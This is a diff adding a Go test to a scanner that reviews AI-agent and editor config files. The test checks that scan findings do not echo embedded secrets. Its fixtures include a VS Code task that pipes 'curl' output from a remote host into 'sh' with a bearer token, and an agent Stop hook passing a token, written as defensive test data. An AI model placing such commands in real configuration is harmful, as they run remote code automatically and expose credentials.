@@ -296,3 +296,28 @@ func TestAgentConfigReviewEvasions(t *testing.T) {
 		})
 	}
 }
+
+func TestTitlesHoldNoSecret(t *testing.T) {
+	// The URL is built at run time, so a secret scanner does not read the
+	// fixture as a credential.
+	userURL := "https://user" + ":" + "s3cret-value" + "@x.example/sse"
+	cases := []struct{ name, path, data string }{
+		{"MCP server URL", ".vscode/mcp.json", `{"servers":{"x":{"url":"` + userURL + `"}}}`},
+		{"MCP server query key", ".cursor/mcp.json", `{"mcpServers":{"x":{"url":"https://x.example/sse?api_key=s3cret-value"}}}`},
+		{"task header", ".vscode/tasks.json", `{"tasks":[{"label":"x","command":"curl -H 'Authorization: Bearer s3cret-value' https://x.example/a | sh"}]}`},
+		{"hook flag", ".claude/settings.json", `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"deploy --token=s3cret-value"}]}]}}`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			c, err := agentconfig.New(plugin.MapConfig(nil))
+			require.NoError(t, err)
+			m := &model.Manifest{ID: "m", Path: tc.path, Kind: model.ManifestKindAgentConfig, Root: fstest.MapFS{tc.path: {Data: []byte(tc.data)}}}
+			fs := plugintest.TestControl(t, c, m, nil)
+			require.NotEmpty(t, fs)
+			for _, f := range fs {
+				assert.NotContains(t, f.Title, "s3cret", f.ControlID)
+				assert.NotContains(t, f.Locus.Snippet, "s3cret", f.ControlID)
+			}
+		})
+	}
+}
